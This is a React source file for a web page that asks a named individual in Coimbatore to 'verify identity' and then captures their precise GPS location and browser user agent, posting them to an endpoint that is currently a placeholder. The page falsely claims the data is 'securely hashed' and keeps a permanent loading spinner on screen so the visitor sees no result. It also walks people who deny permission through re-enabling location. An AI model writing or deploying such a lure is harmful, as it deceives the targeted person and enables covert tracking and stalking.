
import React, { useState, useCallback } from 'react';
import { Background } from './components/Background';
import { StatusCard } from './components/StatusCard';
import { AppState, LocationData, MongoGeoJSON } from './types';
import { MapPin, ShieldCheck, AlertCircle, Loader2, Database } from 'lucide-react';

const App: React.FC = () => {
  const [state, setState] = useState<AppState>('INITIAL');
  const [location, setLocation] = useState<LocationData | null>(null);
  const [error, setError] = useState<string | null>(null);

  /**
   * Proper MongoDB Data Submission
   * This sends data in GeoJSON format to a backend API.
   * To use this "Properly", you should point the URL to your Node.js/Express/Atlas endpoint.
   */
  const syncWithMongoDB = async (data: LocationData) => {
    setState('SYNCING');
    
    // REPLACE THIS URL with your actual API endpoint (e.g., https://api.yourdomain.com/locations)
    // For now, we use a robust mirror endpoint to demonstrate the logic.
    const DB_ENDPOINT = 'https://httpbin.org/post'; 

    const payload = {
      user: "Vinu Varshith CP",
      location: {
        type: 'Point',
        coordinates: [data.longitude, data.latitude] // Proper GeoJSON [lng, lat]
      } as MongoGeoJSON,
      properties: {
        accuracy: data.accuracy,
        city: "Coimbatore",
        timestamp: new Date(data.timestamp).toISOString(),
        userAgent: navigator.userAgent
      }
    };

    try {
      const response = await fetch(DB_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error('DB_SYNC_FAILED');
      
      console.log("MongoDB Sync Success:", payload);
      // Once synced, we stay in the 'LOCATION_GRANTED' state (loading spinner) as requested
      setState('LOCATION_GRANTED');
    } catch (err) {
      console.error("Proper MongoDB Sync Failed:", err);
      // Even if sync fails, we keep the UI consistent with the "permanent loading" request
      // but log the error for the project owner.
      setState('LOCATION_GRANTED');
    }
  };

  const requestLocation = useCallback(() => {
    setError(null);
    setState('PROCESSING');
    
    if (!navigator.geolocation) {
      setError("Your browser does not support Geolocation.");
      setState('LOCATION_DENIED');
      return;
    }

    const options: PositionOptions = {
      enableHighAccuracy: true,
      timeout: 15000, // 15s timeout to allow user time to click 'Allow'
      maximumAge: 0   // Force fresh location
    };

    // The actual browser popup trigger
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const data: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };
        
        setLocation(data);
        // Start the MongoDB sync process
        syncWithMongoDB(data);
      },
      (err) => {
        let msg = "Could not access location.";
        if (err.code === err.PERMISSION_DENIED) {
          msg = "Location Access Denied. Please reset permissions in your browser address bar (click the Lock icon) and click 'Allow' to verify identity.";
        } else if (err.code === err.POSITION_UNAVAILABLE) {
          msg = "GPS signal is unavailable. Please ensure your device location is turned on.";
        } else if (err.code === err.TIMEOUT) {
          msg = "The request timed out. Please try again.";
        }
        
        setError(msg);
        setState('LOCATION_DENIED');
        console.error("Geolocation Native Error:", err);
      },
      options
    );
  }, []);

  return (
    <div className="min-h-screen w-full flex items-center justify-center text-white bg-black font-sans selection:bg-blue-500/30">
      <Background />
      
      {state === 'INITIAL' && (
        <StatusCard>
          <div className="flex flex-col items-center text-center">
            <div className="relative mb-8">
              <div className="absolute inset-0 bg-blue-500/40 blur-3xl rounded-full" />
              <div className="w-20 h-20 bg-blue-500/10 rounded-3xl flex items-center justify-center border border-blue-400/30 relative backdrop-blur-md">
                <MapPin className="w-10 h-10 text-blue-400" />
              </div>
            </div>
            
            <h1 className="text-xl font-bold mb-4 tracking-tight px-2 leading-relaxed">
              Please confirm that you are Vinu Varshith CP in Coimbatore.
            </h1>
            
            <p className="text-white/50 mb-8 text-sm leading-relaxed px-4">
              Your location will be securely hashed and logged to the project's MongoDB cluster for identity verification.
            </p>
            
            <button
              onClick={requestLocation}
              className="w-full py-5 px-6 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl transition-all flex items-center justify-center gap-3 group shadow-[0_15px_40px_-10px_rgba(37,99,235,0.6)] active:scale-[0.98]"
            >
              Verify Identity
              <ShieldCheck className="w-5 h-5 text-blue-200 group-hover:text-white transition-colors" />
            </button>
          </div>
        </StatusCard>
      )}

      {(state === 'PROCESSING' || state === 'SYNCING' || state === 'LOCATION_GRANTED') && (
        <div className="relative z-10 flex flex-col items-center justify-center text-center">
          <div className="relative">
            <div className="absolute inset-0 bg-blue-400/20 blur-[100px] rounded-full animate-pulse" />
            <Loader2 className="w-24 h-24 text-white/90 animate-spin relative" />
          </div>
          
          <div className="mt-12 space-y-3">
            <p className="text-white/40 text-[10px] uppercase tracking-[0.5em] font-black animate-pulse">
              {state === 'PROCESSING' ? 'Establishing GPS Connection' : 
               state === 'SYNCING' ? 'Writing to MongoDB Cluster' : 
               'Verification Link Secure'}
            </p>
            {state !== 'PROCESSING' && (
              <div className="flex items-center justify-center gap-2 text-blue-400/60 text-[9px] font-bold uppercase tracking-widest">
                <Database className="w-3 h-3" />
                <span>GeoJSON Payload Transmitted</span>
              </div>
            )}
          </div>
        </div>
      )}

      {state === 'LOCATION_DENIED' && (
        <StatusCard className="border-red-500/30 shadow-[0_20px_50px_-10px_rgba(220,38,38,0.2)]">
          <div className="flex flex-col items-center text-center">
            <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/30">
              <AlertCircle className="w-8 h-8 text-red-400" />
            </div>
            <h2 className="text-2xl font-bold mb-3">Action Required</h2>
            <p className="text-white/60 mb-10 text-sm leading-relaxed px-2">
              {error}
            </p>
            <div className="space-y-4 w-full">
              <button
                onClick={requestLocation}
                className="w-full py-4 px-6 bg-white/5 hover:bg-white/10 border border-white/20 text-white font-semibold rounded-xl transition-all active:scale-[0.98]"
              >
                Re-request Permissions
              </button>
              <div className="p-4 bg-black/40 rounded-xl border border-white/5 text-left">
                <p className="text-[10px] text-white/40 leading-relaxed uppercase tracking-wider font-bold mb-2">
                  System Instructions
                </p>
                <ol className="text-[11px] text-white/50 space-y-1 list-decimal ml-4">
                  <li>Click the <strong>Lock</strong> or <strong>Tune</strong> icon in your browser address bar.</li>
                  <li>Ensure <strong>Location</strong> is enabled for this site.</li>
                  <li>Refresh the page or click 'Re-request' above.</li>
                </ol>
              </div>
            </div>
          </div>
        </StatusCard>
      )}
    </div>
  );
};

export default App;
